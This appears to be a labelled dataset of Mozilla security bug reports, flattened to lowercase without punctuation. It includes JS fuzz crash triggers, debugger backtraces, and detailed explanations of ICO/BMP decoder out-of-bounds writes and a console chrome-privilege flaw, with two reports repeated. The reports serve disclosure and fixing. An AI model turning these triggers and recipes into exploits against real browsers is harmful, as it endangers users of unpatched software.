assertion failure incbitmap.ismarked cell black at jsgc.cpp:3125 crash js heapptr js baseshape unsigned int operator or crash getcode the following test asserts/crashes/shows valgrind errors on mozilla-central revision 4c6d01c92dcc options m n a var g1 newglobal new-compartment schedulegc g1 gcslice 0 function testeq b var a deserialize serialize b testeq array 1024 join array 1024 join false after stepping through the assertion i get this crash on the debug build program received signal sigsegv segmentation fault in js heapptr js baseshape unsigned int operator js baseshape this at gc/barrier.h:212 212 operator t const return value gdb bt 8 0 in js heapptr js baseshape unsigned int operator js baseshape this at gc/barrier.h:212 1 in js shape base this at jsscope.h:708 2 in js shape getobjectclass this at jsscope.h:607 3 in js objectimpl getclass this at vm/objectimpl-inl.h:245 4 in js objectimpl hasclass this c at vm/objectimpl-inl.h:257 5 in jsobject iswith this at jsobjinlines.h:817 6 in js isactivewithorblock cx obj stackdepth=0 at srv/repos/mozilla-central/js/src/jsinterp.cpp:947 7 in js interpret cx entryframe interpmode=js jsinterp_normal at srv/repos/mozilla-central/js/src/jsinterp.cpp:1890 more interesting however is the behavior on opt-builds in gdb i get this crash program received signal sigsegv segmentation fault getcode cx script pc rval at jsanalyze.h:958 958 bytecode getcode const jsbytecode pc return getcode pc script code gdb bt 8 0 getcode cx script pc rval at jsanalyze.h:958 1 bytecodetypes cx script pc rval at jsanalyze.h:984 2 js types typemonitorresult cx script pc rval at srv/repos/mozilla-central/js/src/jsinfer.cpp:4966 3 in monitor cx entryframe interpmode=js jsinterp_normal at jsinferinlines.h:622 4 js interpret cx entryframe interpmode=js jsinterp_normal at srv/repos/mozilla-central/js/src/jsinterp.cpp:1915 5 in js mjit entermethodjit cx fp code stacklimit partial=false at srv/repos/mozilla-central/js/src/methodjit/methodjit.cpp:1074 6 in checkstackandentermethodjit cx partial=false at srv/repos/mozilla-central/js/src/methodjit/methodjit.cpp:1109 7 js mjit jaegershot cx partial=false at srv/repos/mozilla-central/js/src/methodjit/methodjit.cpp:1121 and on valgrind i see lots of errors with the opt-build indicating some corruption see attached valgrind log marking s-s because of that until investigated	11
assertion failure enumerators cx enumerators object.defineproperty this t2 get function for p in h2 t2 h2 mjitchunklimit 8 h2.a function object t2 asserts js 64-bit debug shell on m-c changeset 65fb8b9ea0b7 with m and n at assertion failure enumerators cx enumerators asserts on windows 7 but apparently not on mac os x 10.7 setting s-s because i m not sure if this is sensitive 64-bit js shell fuzzing on windows 7 was only turned on recently	11
indexeddb wrapper behavior is still totally broken i accidentally added an expando to a request because meta thought onfailure was a good name and i agreed this results in assertion already rooted preservingwrapper file home/visbrero/rev_control/fgit/b2g-gaia/mozilla-central/dom/indexeddb/idbrequest.cpp line 80 i have included a dubiously named xpcshell test for your edification	11
flash plugin related assertion failure false compartment mismatched 1 this occurs on many many urls not just this one this is my current top crasher in crash automation 2 assertion failure false compartment mismatched at js/src/jscntxtinlines.h:227 initially on nightly this was a abort attempt to initialize oop crash reporter before in-process crashreporter gexceptionhandler null file toolkit/crashreporter/nsexceptionhandler.cpp line 2020 but after bug 773830 was fixed it settled down into the assertion it is just the assertion on beta and aurora abort attempt to initialize oop crash reporter before in-process crashreporter gexceptionhandler null file toolkit/crashreporter/nsexceptionhandler.cpp line 2020 then assertion failure false compartment mismatched at js/src/jscntxtinlines.h:227 also crashed nightly aurora may need to reload bp-a9cd5c2f-db62-4383-85c4-a08672120802 firefox 17.0a1 crash report js types typeobject addpropertytype bp-723b5531-d568-4856-9977-3ee742120802 firefox 15.0a2 crash report js gc pushmarkstack found regression between 20120712015541-20120712174703 pushlog found regression between 20120715024321-20120716024822 pushlog did n't see the abort here found regression between 20120718210721-20120719120951 pushlog did n't see abort here	11
crash jsc yarr execute or js regexpshared execute r evalcx x undefined s gc function s.match r schedulegc proto c schedulegc 2 s.match r crashes js debug shell on m-c changeset 6c60e99d9739 without any cli arguments at jsc yarr execute with js regexpshared execute on the stack	11
nsbmpdecoder alpha channel processing memory corruption this bug is present in the nsbmpdecoder class in the code responsible for processing alpha channel data it allows a remote attacker to write random memory hence the critical severity user action is needed in the following form the user needs to open a web page containing a specially crafted image the vulnerable code lies in nsbmpdecoder.cpp at line 519 510 if musealphadata 511 if mhavealphadata p 3 512 non-zero alpha byte detected clear previous 513 pixels that we have already processed 514 this works because we know that if we 515 are reaching here then the alpha data in byte 516 4 has been right all along and we know it 517 has been set to 0 the whole time so that 518 means that everything is transparent so far 519 memset mimagedata mcurline 1 getwidth 0 520 getheight mcurline 1 521 getwidth sizeof pruint32 522 mhavealphadata true 523 this code is responsible for clearing pixels in the mimagedata array when it is processing a bmp image with an alpha channel and encounters for the first time a non-zero alpha byte the third parameter of memset is calculated using getheight which returns the raw height header value even when it is negative which is allowed for bmp images it means pixels are stored top-to-bottom instead of bottom-to-top the result of this calculation is then used as an unsigned 32 bits integer by memset if getheight returns a negative value the calculation will result in a very large unsigned number and memset will run past the mimagedata array resulting in a memory corruption which could in turn lead to arbitrary code execution the code snippet above will be executed only if musealphadata is true the only way for this to happen is to have a bmp image embedded in an icon file ico the nsicodecoder will instantiate a nsbmpdecoder and call its method setusealphadata with the parameter true which will set musealphadata to true nsicodecoder.cpp 434 nsbmpdecoder bmpdecoder new nsbmpdecoder mimage mobserver 435 mcontaineddecoder bmpdecoder 436 bmpdecoder setusealphadata true another condition is that the bmp pixel array must be in 32 bits per pixel format red green blue alpha this is done simply by setting the bpp field to 32 in the image header the last condition is that at least one alpha byte must be non-zero the attached file bmp_with_alpha.ico triggers the vulnerability here is a windbg log when exploiting the vulnerability in firefox on windows xp 53c.734 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=062f0380 ebx=05c3a0d0 ecx=01ffffd8 edx=00000000 esi=05d1fdd8 edi=062f1000 eip=781472d7 esp=0012cbe8 ebp=0012cbec iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 msvcr80 strnicmp 781472d7 660f7f07 movdqa xmmword ptr edi xmm0 ds:0023:062f1000 0:000 k childebp retaddr warning stack unwind information not available following frames may be wrong 0012cbec 78147344 msvcr80 strnicmp 0012cc0c 012ecf98 msvcr80 strnicmp 0012cc44 0119f049 xul mozilla imagelib nsbmpdecoder writeinternal 0012cca8 010de143 xul mozilla imagelib nsicodecoder fixbitmapwidth e builds\moz2_slave\rel-m-rel-w32-bld\build\image\decoders\nsicodecoder.cpp 208 0012ccc8 0113410e xul mozilla imagelib rasterimage writetodecoder e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2370 0012cce4 010b9526 xul mozilla imagelib rasterimage decodesomedata e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2702 0012cd3c 010f6ba2 xul mozilla imagelib imgdecodeworker run e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2819 0012cd50 010f6be3 xul mozilla imagelib rasterimage addsourcedata e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 1496 0012cda4 0104cfb6 xul mozilla imagelib rasterimage writetorasterimage e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2917 0012cda4 0104cfb6 xul imgrequest ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\imgrequest.cpp 1166 0012d004 010f1121 xul imgrequest ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\imgrequest.cpp 1166 0012d024 010a7f3a xul proxylistener ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\imgloader.cpp 2091 0012d050 010981c3 xul nsbasechannel ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\netwerk\base\src\nsbasechannel.cpp 774 0012d094 0109807a xul nsinputstreampump onstatetransfer e builds\moz2_slave\rel-m-rel-w32-bld\build\netwerk\base\src\nsinputstreampump.cpp 512 0012d0a8 01097df3 xul nsinputstreampump oninputstreamready e builds\moz2_slave\rel-m-rel-w32-bld\build\netwerk\base\src\nsinputstreampump.cpp 409 0012d0b8 00fbee5f xul nsinputstreamreadyevent run e builds\moz2_slave\rel-m-rel-w32-bld\build\xpcom\io\nsstreamutils.cpp 115 0012d104 100026f5 xul nsthread processnextevent e builds\moz2_slave\rel-m-rel-w32-bld\build\xpcom\threads\nsthread.cpp 666 0012d144 011bc8e2 nspr4 pr_unlock 00000000 00000000 xul messageloop runhandler e builds\moz2_slave\rel-m-rel-w32-bld\build\ipc\chromium\src\base\message_loop.cc 202	11
nsicodecoder transparency bitmask memory corruption this bug is present in the nsicodecoder class when processing the transparency bitmask it allows a remote attacker to write random memory hence the critical severity user action is needed in the following form the user needs to open a web page containing a specially crafted image first a little summary of how firefox processes a bmp embedded inside an ico image it reads the icondirentry it reads the image header it divides the image height by 2 it passes the image header and the image data to a bmp decoder it applies the transparency bitmask to the rendered image before passing the bmp image header and data to the bmp decoder the nsicodecoder checks that the properties in the icondirentry structure are consistent with the properties in the bmp header and fixes them if necessary since the maximum height of an icon is 256 it checks that the bmp header height is no more than 256 the image is considered invalid if it exceeds 256 also if the height in the icondirentry structure and the height in the bmp header do n't match then the height in the bmp header is trusted over the height in the icondirentry structure here is the code responsible for doing this in the file nsicodecoder.cpp 166 a bmp inside of an ico has 2 height because of the and mask 167 that follows the actual bitmap the bmp should n't know about 168 this difference though 169 bool 170 nsicodecoder fixbitmapheight print8 bih 171 172 get the height from the bmp file information header 173 print32 height 174 memcpy height bih 8 sizeof height 175 height little_to_native32 height 176 177 the bitmap height is by definition 2 what it should be to account for 178 the and mask it is 2 even if the and mask is not present 179 height 2 180 181 if height 256 182 return false 183 184 185 we should always trust the height from the bitmap itself instead of 186 the ico height so fix the ico height 187 if height 256 188 mdirentry.mheight 0 189 else 190 mdirentry.mheight print8 height 191 192 193 fix the bmp height in the bih so that the bmp decoder can work properly 194 height native32_to_little height 195 memcpy bih 8 height sizeof height 196 return true 197 the mdirentry.mheight variable is then used to calculate the pixel offset when applying the transparency bitmask note getrealheight returns mdirentry.mheight 542 mcurline getrealheight 575 pruint32 decoded imagedata mcurline getrealwidth 576 pruint32 decoded_end decoded getrealwidth 577 pruint8 p mrow p_end mrow rowsize 578 while p p_end 579 pruint8 idx p 580 for pruint8 bit bit decoded decoded_end bit 1 581 clear pixel completely for transparency 582 if idx bit 583 decoded 0 584 585 decoded 586 587 the vulnerability is in the nsicodecoder fixbitmapheight function the height variable is declared as a print32 which is a signed 32 bits integer consequently if the height field of the bmp header is negative it will pass the check at line 181 181 if height 256 182 return false 183 it will then be truncated to fit into a 8 bits integer namely mdirentry.mheight 187 if height 256 188 mdirentry.mheight 0 189 else 190 mdirentry.mheight print8 height 191 mdirentry.mheight is an unsigned 8 bits integer so when it is assigned to mcurline mcurline can be higher than the real height of the image causing the processing of the transparency bitmask to write past the imagedata array resulting in memory corruption this is possible because negative heights in bmp headers are acceptable so the bmp decoder will process the image normally to illustrate what happens with an example we ll take a 32x8 pixels image we have to double the initial height to account for the transparency bitmask and make it negative so the height value in the bmp header will be 16 which is when we enter the nsicodecoder fixbitmapheight function here is what happens first the height is divided by 2 its new value is 8 or the check at line 181 is passed since 8 is not superior to 256 mdirentry.mheight is assigned the value of which is truncated to 8 bits the bmp decoder processes the bmp data allocating an array large enough to contain our 32x8 pixels image the mcurline variable is assigned the value of mdirentry.mheight since mdirentry.mheight is an unsigned byte mcurline is equal to which is 248 in decimal nsicodecoder uses mcurline to calculate an offset to the image data array since 248 is larger than the image real height of 8 data is written past the end of the imagedata array causing memory corruption at line 583 the attached sample ico file triggers the vulnerability here is a windbg log when exploiting the vulnerability in firefox on windows xp 540.564 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=071a7c80 ebx=01f03b64 ecx=01f03b63 edx=000000ff esi=071a7bc0 edi=05f86530 eip=0113834a esp=0012cc68 ebp=0012cca8 iopl=0 nv up ei ng nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010282 e builds\moz2_slave\rel-m-rel-w32-bld\build\image\decoders\nsicodecoder.cpp 583 xul mozilla imagelib nsicodecoder writeinternal 0113834a c70600000000 mov dword ptr esi 0 ds:0023:071a7bc0 0:000 k childebp retaddr 0012cca8 010de143 xul mozilla imagelib nsicodecoder writeinternal e builds\moz2_slave\rel-m-rel-w32-bld\build\image\decoders\nsicodecoder.cpp 583 0012ccc8 0113410e xul mozilla imagelib rasterimage writetodecoder e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2370 0012cce4 010b9526 xul mozilla imagelib rasterimage decodesomedata e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2702 0012cd3c 010f6ba2 xul mozilla imagelib imgdecodeworker run e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2819 0012cd50 010f6be3 xul mozilla imagelib rasterimage addsourcedata e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 1496 0012cda4 0104cfb6 xul mozilla imagelib rasterimage writetorasterimage e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2917 0012cda4 0104cfb6 xul imgrequest ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\imgrequest.cpp 1166 0012d004 010f1121 xul imgrequest ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\imgrequest.cpp 1166 0012d024 010a7f3a xul proxylistener ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\imgloader.cpp 2091 0012d050 010981c3 xul nsbasechannel ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\netwerk\base\src\nsbasechannel.cpp 774 0012d094 0109807a xul nsinputstreampump onstatetransfer e builds\moz2_slave\rel-m-rel-w32-bld\build\netwerk\base\src\nsinputstreampump.cpp 512 0012d0a8 01097df3 xul nsinputstreampump oninputstreamready e builds\moz2_slave\rel-m-rel-w32-bld\build\netwerk\base\src\nsinputstreampump.cpp 409 0012d0b8 00fbee5f xul nsinputstreamreadyevent run e builds\moz2_slave\rel-m-rel-w32-bld\build\xpcom\io\nsstreamutils.cpp 115 0012d110 00fe3e9e xul nsthread processnextevent e builds\moz2_slave\rel-m-rel-w32-bld\build\xpcom\threads\nsthread.cpp 666 0012d144 011bc8e2 xul mozilla ipc messagepump run e builds\moz2_slave\rel-m-rel-w32-bld\build\ipc\glue\messagepump.cpp 110 0012d17c 011bc8b3 xul messageloop runhandler e builds\moz2_slave\rel-m-rel-w32-bld\build\ipc\chromium\src\base\message_loop.cc 202 0012d198 011991b8 xul messageloop run e builds\moz2_slave\rel-m-rel-w32-bld\build\ipc\chromium\src\base\message_loop.cc 176 0012d1a4 011bc9b0 xul nsbaseappshell run e builds\moz2_slave\rel-m-rel-w32-bld\build\widget\src\xpwidgets\nsbaseappshell.cpp 191 0012f0f8 011bc9f2 xul nsappshell run e builds\moz2_slave\rel-m-rel-w32-bld\build\widget\src\windows\nsappshell.cpp 258 0012f4a4 00401796 xul nsappstartup run e builds\moz2_slave\rel-m-rel-w32-bld\build\toolkit\components\startup\nsappstartup.cpp 221 0012ff7c 00401ab0 firefox wmain e builds\moz2_slave\rel-m-rel-w32-bld\build\toolkit\xre\nswindowswmain.cpp 107 0012ffc0 7c817077 firefox tmaincrtstartup f sp\vctools\crt_bld\self_x86\crt\src\crtexe.c 594	11
nsbmpdecoder alpha channel processing memory corruption this bug is present in the nsbmpdecoder class in the code responsible for processing alpha channel data it allows a remote attacker to write random memory hence the critical severity user action is needed in the following form the user needs to open a web page containing a specially crafted image the vulnerable code lies in nsbmpdecoder.cpp at line 519 510 if musealphadata 511 if mhavealphadata p 3 512 non-zero alpha byte detected clear previous 513 pixels that we have already processed 514 this works because we know that if we 515 are reaching here then the alpha data in byte 516 4 has been right all along and we know it 517 has been set to 0 the whole time so that 518 means that everything is transparent so far 519 memset mimagedata mcurline 1 getwidth 0 520 getheight mcurline 1 521 getwidth sizeof pruint32 522 mhavealphadata true 523 this code is responsible for clearing pixels in the mimagedata array when it is processing a bmp image with an alpha channel and encounters for the first time a non-zero alpha byte the third parameter of memset is calculated using getheight which returns the raw height header value even when it is negative which is allowed for bmp images it means pixels are stored top-to-bottom instead of bottom-to-top the result of this calculation is then used as an unsigned 32 bits integer by memset if getheight returns a negative value the calculation will result in a very large unsigned number and memset will run past the mimagedata array resulting in a memory corruption which could in turn lead to arbitrary code execution the code snippet above will be executed only if musealphadata is true the only way for this to happen is to have a bmp image embedded in an icon file ico the nsicodecoder will instantiate a nsbmpdecoder and call its method setusealphadata with the parameter true which will set musealphadata to true nsicodecoder.cpp 434 nsbmpdecoder bmpdecoder new nsbmpdecoder mimage mobserver 435 mcontaineddecoder bmpdecoder 436 bmpdecoder setusealphadata true another condition is that the bmp pixel array must be in 32 bits per pixel format red green blue alpha this is done simply by setting the bpp field to 32 in the image header the last condition is that at least one alpha byte must be non-zero the attached file bmp_with_alpha.ico triggers the vulnerability here is a windbg log when exploiting the vulnerability in firefox on windows xp 53c.734 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=062f0380 ebx=05c3a0d0 ecx=01ffffd8 edx=00000000 esi=05d1fdd8 edi=062f1000 eip=781472d7 esp=0012cbe8 ebp=0012cbec iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 msvcr80 strnicmp 781472d7 660f7f07 movdqa xmmword ptr edi xmm0 ds:0023:062f1000 0:000 k childebp retaddr warning stack unwind information not available following frames may be wrong 0012cbec 78147344 msvcr80 strnicmp 0012cc0c 012ecf98 msvcr80 strnicmp 0012cc44 0119f049 xul mozilla imagelib nsbmpdecoder writeinternal 0012cca8 010de143 xul mozilla imagelib nsicodecoder fixbitmapwidth e builds\moz2_slave\rel-m-rel-w32-bld\build\image\decoders\nsicodecoder.cpp 208 0012ccc8 0113410e xul mozilla imagelib rasterimage writetodecoder e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2370 0012cce4 010b9526 xul mozilla imagelib rasterimage decodesomedata e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2702 0012cd3c 010f6ba2 xul mozilla imagelib imgdecodeworker run e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2819 0012cd50 010f6be3 xul mozilla imagelib rasterimage addsourcedata e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 1496 0012cda4 0104cfb6 xul mozilla imagelib rasterimage writetorasterimage e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2917 0012cda4 0104cfb6 xul imgrequest ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\imgrequest.cpp 1166 0012d004 010f1121 xul imgrequest ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\imgrequest.cpp 1166 0012d024 010a7f3a xul proxylistener ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\imgloader.cpp 2091 0012d050 010981c3 xul nsbasechannel ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\netwerk\base\src\nsbasechannel.cpp 774 0012d094 0109807a xul nsinputstreampump onstatetransfer e builds\moz2_slave\rel-m-rel-w32-bld\build\netwerk\base\src\nsinputstreampump.cpp 512 0012d0a8 01097df3 xul nsinputstreampump oninputstreamready e builds\moz2_slave\rel-m-rel-w32-bld\build\netwerk\base\src\nsinputstreampump.cpp 409 0012d0b8 00fbee5f xul nsinputstreamreadyevent run e builds\moz2_slave\rel-m-rel-w32-bld\build\xpcom\io\nsstreamutils.cpp 115 0012d104 100026f5 xul nsthread processnextevent e builds\moz2_slave\rel-m-rel-w32-bld\build\xpcom\threads\nsthread.cpp 666 0012d144 011bc8e2 nspr4 pr_unlock 00000000 00000000 xul messageloop runhandler e builds\moz2_slave\rel-m-rel-w32-bld\build\ipc\chromium\src\base\message_loop.cc 202	11
nsicodecoder transparency bitmask memory corruption this bug is present in the nsicodecoder class when processing the transparency bitmask it allows a remote attacker to write random memory hence the critical severity user action is needed in the following form the user needs to open a web page containing a specially crafted image first a little summary of how firefox processes a bmp embedded inside an ico image it reads the icondirentry it reads the image header it divides the image height by 2 it passes the image header and the image data to a bmp decoder it applies the transparency bitmask to the rendered image before passing the bmp image header and data to the bmp decoder the nsicodecoder checks that the properties in the icondirentry structure are consistent with the properties in the bmp header and fixes them if necessary since the maximum height of an icon is 256 it checks that the bmp header height is no more than 256 the image is considered invalid if it exceeds 256 also if the height in the icondirentry structure and the height in the bmp header do n't match then the height in the bmp header is trusted over the height in the icondirentry structure here is the code responsible for doing this in the file nsicodecoder.cpp 166 a bmp inside of an ico has 2 height because of the and mask 167 that follows the actual bitmap the bmp should n't know about 168 this difference though 169 bool 170 nsicodecoder fixbitmapheight print8 bih 171 172 get the height from the bmp file information header 173 print32 height 174 memcpy height bih 8 sizeof height 175 height little_to_native32 height 176 177 the bitmap height is by definition 2 what it should be to account for 178 the and mask it is 2 even if the and mask is not present 179 height 2 180 181 if height 256 182 return false 183 184 185 we should always trust the height from the bitmap itself instead of 186 the ico height so fix the ico height 187 if height 256 188 mdirentry.mheight 0 189 else 190 mdirentry.mheight print8 height 191 192 193 fix the bmp height in the bih so that the bmp decoder can work properly 194 height native32_to_little height 195 memcpy bih 8 height sizeof height 196 return true 197 the mdirentry.mheight variable is then used to calculate the pixel offset when applying the transparency bitmask note getrealheight returns mdirentry.mheight 542 mcurline getrealheight 575 pruint32 decoded imagedata mcurline getrealwidth 576 pruint32 decoded_end decoded getrealwidth 577 pruint8 p mrow p_end mrow rowsize 578 while p p_end 579 pruint8 idx p 580 for pruint8 bit bit decoded decoded_end bit 1 581 clear pixel completely for transparency 582 if idx bit 583 decoded 0 584 585 decoded 586 587 the vulnerability is in the nsicodecoder fixbitmapheight function the height variable is declared as a print32 which is a signed 32 bits integer consequently if the height field of the bmp header is negative it will pass the check at line 181 181 if height 256 182 return false 183 it will then be truncated to fit into a 8 bits integer namely mdirentry.mheight 187 if height 256 188 mdirentry.mheight 0 189 else 190 mdirentry.mheight print8 height 191 mdirentry.mheight is an unsigned 8 bits integer so when it is assigned to mcurline mcurline can be higher than the real height of the image causing the processing of the transparency bitmask to write past the imagedata array resulting in memory corruption this is possible because negative heights in bmp headers are acceptable so the bmp decoder will process the image normally to illustrate what happens with an example we ll take a 32x8 pixels image we have to double the initial height to account for the transparency bitmask and make it negative so the height value in the bmp header will be 16 which is when we enter the nsicodecoder fixbitmapheight function here is what happens first the height is divided by 2 its new value is 8 or the check at line 181 is passed since 8 is not superior to 256 mdirentry.mheight is assigned the value of which is truncated to 8 bits the bmp decoder processes the bmp data allocating an array large enough to contain our 32x8 pixels image the mcurline variable is assigned the value of mdirentry.mheight since mdirentry.mheight is an unsigned byte mcurline is equal to which is 248 in decimal nsicodecoder uses mcurline to calculate an offset to the image data array since 248 is larger than the image real height of 8 data is written past the end of the imagedata array causing memory corruption at line 583 the attached sample ico file triggers the vulnerability here is a windbg log when exploiting the vulnerability in firefox on windows xp 540.564 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=071a7c80 ebx=01f03b64 ecx=01f03b63 edx=000000ff esi=071a7bc0 edi=05f86530 eip=0113834a esp=0012cc68 ebp=0012cca8 iopl=0 nv up ei ng nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010282 e builds\moz2_slave\rel-m-rel-w32-bld\build\image\decoders\nsicodecoder.cpp 583 xul mozilla imagelib nsicodecoder writeinternal 0113834a c70600000000 mov dword ptr esi 0 ds:0023:071a7bc0 0:000 k childebp retaddr 0012cca8 010de143 xul mozilla imagelib nsicodecoder writeinternal e builds\moz2_slave\rel-m-rel-w32-bld\build\image\decoders\nsicodecoder.cpp 583 0012ccc8 0113410e xul mozilla imagelib rasterimage writetodecoder e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2370 0012cce4 010b9526 xul mozilla imagelib rasterimage decodesomedata e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2702 0012cd3c 010f6ba2 xul mozilla imagelib imgdecodeworker run e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2819 0012cd50 010f6be3 xul mozilla imagelib rasterimage addsourcedata e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 1496 0012cda4 0104cfb6 xul mozilla imagelib rasterimage writetorasterimage e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\rasterimage.cpp 2917 0012cda4 0104cfb6 xul imgrequest ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\imgrequest.cpp 1166 0012d004 010f1121 xul imgrequest ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\imgrequest.cpp 1166 0012d024 010a7f3a xul proxylistener ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\image\src\imgloader.cpp 2091 0012d050 010981c3 xul nsbasechannel ondataavailable e builds\moz2_slave\rel-m-rel-w32-bld\build\netwerk\base\src\nsbasechannel.cpp 774 0012d094 0109807a xul nsinputstreampump onstatetransfer e builds\moz2_slave\rel-m-rel-w32-bld\build\netwerk\base\src\nsinputstreampump.cpp 512 0012d0a8 01097df3 xul nsinputstreampump oninputstreamready e builds\moz2_slave\rel-m-rel-w32-bld\build\netwerk\base\src\nsinputstreampump.cpp 409 0012d0b8 00fbee5f xul nsinputstreamreadyevent run e builds\moz2_slave\rel-m-rel-w32-bld\build\xpcom\io\nsstreamutils.cpp 115 0012d110 00fe3e9e xul nsthread processnextevent e builds\moz2_slave\rel-m-rel-w32-bld\build\xpcom\threads\nsthread.cpp 666 0012d144 011bc8e2 xul mozilla ipc messagepump run e builds\moz2_slave\rel-m-rel-w32-bld\build\ipc\glue\messagepump.cpp 110 0012d17c 011bc8b3 xul messageloop runhandler e builds\moz2_slave\rel-m-rel-w32-bld\build\ipc\chromium\src\base\message_loop.cc 202 0012d198 011991b8 xul messageloop run e builds\moz2_slave\rel-m-rel-w32-bld\build\ipc\chromium\src\base\message_loop.cc 176 0012d1a4 011bc9b0 xul nsbaseappshell run e builds\moz2_slave\rel-m-rel-w32-bld\build\widget\src\xpwidgets\nsbaseappshell.cpp 191 0012f0f8 011bc9f2 xul nsappshell run e builds\moz2_slave\rel-m-rel-w32-bld\build\widget\src\windows\nsappshell.cpp 258 0012f4a4 00401796 xul nsappstartup run e builds\moz2_slave\rel-m-rel-w32-bld\build\toolkit\components\startup\nsappstartup.cpp 221 0012ff7c 00401ab0 firefox wmain e builds\moz2_slave\rel-m-rel-w32-bld\build\toolkit\xre\nswindowswmain.cpp 107 0012ffc0 7c817077 firefox tmaincrtstartup f sp\vctools\crt_bld\self_x86\crt\src\crtexe.c 594	11
graphite 2 crash graphite2 silf readclassmap no description provided	7
graphite 2 crash graphite2 pass readpass no description provided	7
bypassing security checks for nslocation checkurl getcontextfromstack ignores jscontext for contentframemessagemanager if getcontextfromstack ends up not getting a jscontext nslocation checkurl does not do security checks this could allow content to load restricted urls	2
console eval results capable of executing chrome-privileged code current release and beta builds vulnerable 13 and 14 1 open the attached poc 2 in the web console inspect the paragraph element document.getelementbyid p hudservice.jsm plays it loose with wrapperless eval results jst_execute passes the eval result into formatresult which allows the content-supplied object to override tosource or tostring to return whatever it likes from there it hits writeoutputjs and createmessagenode side note for fun starting with writeoutputjs follow the call graph and check out all the places the unsafe aoutputobject can visit 5059 if the tosource/tostring override returned a dom node that node eventually gets inserted into the browser.xul document from there we can do the ol exploit on event attributes to run with chrome privileges plausible attack take something interesting like a prouget demo and insert a variation of this exploit use proxies those are available to content right to ensure that virtually any expression that the user enters will result in an object with a malicious tosource/tostring this poc does n't work with aurora and nightly builds due to the async console split bug 673148 and further changes it s possible that hudservice-content.js is vulnerable though i simply have n't looked into it sorry for the drive-by and hurried comment it s late and i have early morning obligations	9
xpcshell test netwerk/test/unit/test_mime_params.js fails on addresssanitizer the xpcshell test netwerk/test/unit/test_mime_params.js shows an addresssanitizer error on mozilla-central revision f7cf60910637 60029 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in nsmimeheaderparamimpl doparameterinternal char const char const nsmimeheaderparamimpl paramdecoding char char char mozilla-central/netwerk/mime/nsmimeheaderparamimpl.cpp:449 1 in nsmimeheaderparamimpl dogetparameter nsacstring_internal const char const nsmimeheaderparamimpl paramdecoding nsacstring_internal const bool char nsastring_internal mozilla-central/netwerk/mime/nsmimeheaderparamimpl.cpp:82 2 in nsmimeheaderparamimpl getparameter nsacstring_internal const char const nsacstring_internal const bool char nsastring_internal mozilla-central/netwerk/mime/nsmimeheaderparamimpl.cpp:49 3 in ns_invokebyindex_p mozilla-central/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:165 4 in callmethodhelper invoke mozilla-central/js/xpconnect/src/xpcwrappednative.cpp:3118 5 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode mozilla-central/js/xpconnect/src/xpcwrappednative.cpp:2418 6 in xpc_wn_callmethod jscontext unsigned int js value mozilla-central/js/xpconnect/src/xpcwrappednativejsops.cpp:1480 7 in 8 in js mjit entermethodjit jscontext js stackframe void js value bool mozilla-central/js/src/methodjit/methodjit.cpp:1016 9 in checkstackandentermethodjit jscontext js stackframe void bool mozilla-central/js/src/methodjit/methodjit.cpp:1074 10 in js interpret jscontext js stackframe js interpmode mozilla-central/js/src/jsinterp.cpp:1475 11 in js runscript jscontext jsscript js stackframe mozilla-central/js/src/jsinterp.cpp:308 12 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value 